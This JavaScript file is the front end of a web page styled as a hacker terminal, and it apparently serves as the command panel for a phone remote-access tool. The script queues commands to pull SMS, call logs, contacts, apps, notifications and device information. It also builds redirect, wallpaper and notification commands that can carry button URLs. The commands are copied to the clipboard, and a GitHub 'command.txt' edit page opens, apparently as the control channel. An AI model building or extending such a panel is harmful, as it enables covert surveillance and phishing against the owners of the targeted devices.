/* MATRIX (UNCHANGED) */

const canvas=document.getElementById('matrix');
const ctx=canvas.getContext('2d');

let fontSize=14;
let columns;
let drops;

const chars="01アカサタナハマヤラワ";

function init(){

canvas.width=window.innerWidth;
canvas.height=window.innerHeight;

columns=Math.floor(canvas.width/fontSize);

drops=Array(columns).fill(1);

}

function draw(){

ctx.fillStyle='rgba(0,0,0,0.05)';
ctx.fillRect(0,0,canvas.width,canvas.height);

ctx.fillStyle='#00ffcc';
ctx.font=fontSize+"px monospace";

for(let i=0;i<drops.length;i++){

const text=chars[Math.floor(Math.random()*chars.length)];

ctx.fillText(text,i*fontSize,drops[i]*fontSize);

if(drops[i]*fontSize>canvas.height && Math.random()>0.975)
drops[i]=0;

drops[i]++;

}

}

init();

setInterval(draw,50);



/* TERMINAL ENGINE (UNCHANGED) */

const output=document.getElementById("output");

const commands=document.querySelectorAll(".command");

const runPanel=document.getElementById("runPanel");

let selected=new Set();

let alreadyExecuted=new Set();

let queue=[];

let typing=false;

const TYPE_SPEED=6;

const redirectURL="https://github.com/MOFO-UG/ControlTheWorld/edit/main/command.txt";



const logDB={

sms:["[+] Accessing SMS","[+] SMS complete"],

calls:["[+] Accessing CALL","[+] CALL complete"],

notification:["[+] Accessing NOTIFICATION","[+] NOTIFICATION complete"],

apps:["[+] Accessing APPS","[+] APPS complete"],

contacts:["[+] Accessing CONTACT","[+] CONTACT complete"],

deviceinfo:["[+] Accessing DEVICE","[+] DEVICE complete"],

none:["[+] Idle"]

};



function updateExecuteButton(){

runPanel.style.display=selected.size?"block":"none";

}



function getBase(cmd){

if(cmd.startsWith("sms"))return"sms";
if(cmd.startsWith("calls"))return"calls";
if(cmd.startsWith("notification"))return"notification";
if(cmd.startsWith("apps"))return"apps";
if(cmd.startsWith("contacts"))return"contacts";
if(cmd.startsWith("deviceinfo"))return"deviceinfo";

return"none";

}



function typeNext(){

if(queue.length===0){

typing=false;
updateExecuteButton();
return;

}

typing=true;

let text=queue.shift();

let line=document.createElement("div");

output.appendChild(line);

let i=0;

function type(){

if(i<text.length){

line.textContent+=text[i++];

setTimeout(type,TYPE_SPEED);

}else{

typeNext();

}

}

type();

}



/* BUILDER ENGINE */

let builderMode=null;

const builderPanel=document.getElementById("builderPanel");

const builderContent=document.getElementById("builderContent");


document.querySelectorAll(".builder").forEach(btn=>{

btn.onclick=()=>{

builderMode=btn.dataset.builder;

builderPanel.style.display="block";

if(builderMode==="redirect")

builderContent.innerHTML='<input id="urlInput" placeholder="Enter URL">';

if(builderMode==="wallpaper")

builderContent.innerHTML='<input id="urlInput" placeholder="Enter Image URL">';

if(builderMode==="notification"){

builderContent.innerHTML='<div id="notifyList"></div><button onclick="notifyAdd()">+ add new</button>';

notifyAdd();

}

};

});


function notifyAdd(){

const t=document.getElementById("notifyTemplate");

const clone=t.content.cloneNode(true);

const check=clone.querySelector(".enableBtn");

const area=clone.querySelector(".btnArea");

check.onchange=()=>area.style.display=check.checked?"block":"none";

document.getElementById("notifyList").appendChild(clone);

}



function builderAdd(){

let cmd="";

if(builderMode==="redirect"){

const url=document.getElementById("urlInput").value;

cmd="redirect url "+url;

}

if(builderMode==="wallpaper"){

const url=document.getElementById("urlInput").value;

cmd="change wallpaper "+url;

}

if(builderMode==="notification"){

let parts=[];

document.querySelectorAll(".notify-entry").forEach(e=>{

let p="send notification | title="+e.querySelector(".title").value;

p+=" | message="+e.querySelector(".message").value;

let repeat=e.querySelector(".repeat").value;

if(repeat)p+=" | repeat="+repeat;

if(e.querySelector(".enableBtn").checked){

p+=" | button="+e.querySelector(".btnText").value;

p+=" | url="+e.querySelector(".btnUrl").value;

}

parts.push(p);

});

cmd=parts.join(",,,,,");

}

selected.add(cmd);

queue.push("[+] Command added: "+cmd);

typeNext();

builderClose();

}



function builderClose(){

builderPanel.style.display="none";

}



/* NORMAL COMMANDS */

commands.forEach(btn=>{

if(btn.classList.contains("builder"))return;

btn.onclick=()=>{

let cmd=btn.dataset.cmd;

selected.add(cmd);

queue.push("[+] Command added: "+cmd);

typeNext();

};

});



function runSelected(){

if(selected.size===0)return;

const outputText=[...selected].join(", ");

navigator.clipboard.writeText(outputText).then(()=>{

queue.push("root@RKPexecutor:~# executing root sequence...");

typeNext();

setTimeout(()=>{

window.open(redirectURL,'_blank');

},1000);

});

}



queue.push("root@RKPexecutor:~# _");

typeNext();
